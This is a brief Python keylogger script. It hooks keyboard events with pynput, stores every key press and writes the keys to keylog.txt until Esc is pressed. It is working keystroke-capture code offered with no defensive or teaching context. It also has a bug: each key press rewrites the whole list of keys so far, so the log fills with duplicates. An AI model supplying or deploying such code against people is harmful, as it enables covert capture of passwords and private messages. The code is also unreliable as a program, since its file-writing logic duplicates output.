import pynput.keyboard

# Global variable to store the logged keys
logged_keys = []

# Function to write the logged keys to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

# Function to handle key press events
def on_press(key):
    global logged_keys
    logged_keys.append(key)
    write_to_file(logged_keys)

# Function to handle key release events
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Start listening for key events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
